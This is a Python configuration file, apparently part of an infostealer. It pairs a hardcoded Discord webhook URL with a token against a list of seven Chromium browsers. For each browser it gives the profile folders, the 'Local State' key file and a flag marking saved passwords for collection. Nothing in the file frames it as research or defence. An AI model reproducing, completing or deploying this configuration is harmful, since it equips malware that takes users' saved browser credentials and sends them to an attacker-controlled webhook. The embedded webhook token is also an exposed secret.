import os


WEBHOOK_URL = "https://discord.com/api/webhooks/1438590458204000289/GoNmnNIWqcL152FVm8uszof971e2NnyNjsO4j_o4ZJuP9AhMaaR5XBEkkYcKP1GBcouo"
CHROMIUM_BROWSERS = [
    {
        "name": "Brave Stable",
        "base": "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data",
        "state": "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Brave_Stable",
        "pwd": True,
        "exe": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
    },
    {
        "name": "Opera Stable",
        "base": "%APPDATA%\\Opera Software\\Opera Stable",
        "state": "%APPDATA%\\Opera Software\\Opera Stable\\Local State",
        "profiles": [""],
        "folder": "Opera_Stable",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Programs\Opera\opera.exe"
    },
    {
        "name": "Opera GX",
        "base": "%APPDATA%\\Opera Software\\Opera GX Stable",
        "state": "%APPDATA%\\Opera Software\\Opera GX Stable\\Local State",
        "profiles": [""],
        "folder": "Opera_GX",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Programs\Opera GX\opera.exe"
    },
    {
        "name": "Edge Stable",
        "base": "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
        "state": "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Edge_Stable",
        "pwd": True,
        "exe": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    },
    {
        "name": "Vivaldi",
        "base": "%LOCALAPPDATA%\\Vivaldi\\User Data",
        "state": "%LOCALAPPDATA%\\Vivaldi\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Vivaldi",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Vivaldi\Application\vivaldi.exe"
    },
    {
    "name": "Avast Secure Browser",
    "base": "%LOCALAPPDATA%\\AVAST Software\\Browser\\User Data",
    "state": "%LOCALAPPDATA%\\AVAST Software\\Browser\\User Data\\Local State",
    "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
    "folder": "Avast_Secure",
    "pwd": True,
    "exe": r"C:\Program Files (x86)\AVAST Software\Browser\Application\AvastBrowser.exe"
    },
    {
        "name": "Chrome Stable",
        "base": "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
        "state": "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Chrome_Stable",
        "pwd": True,
        "exe": r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    }

]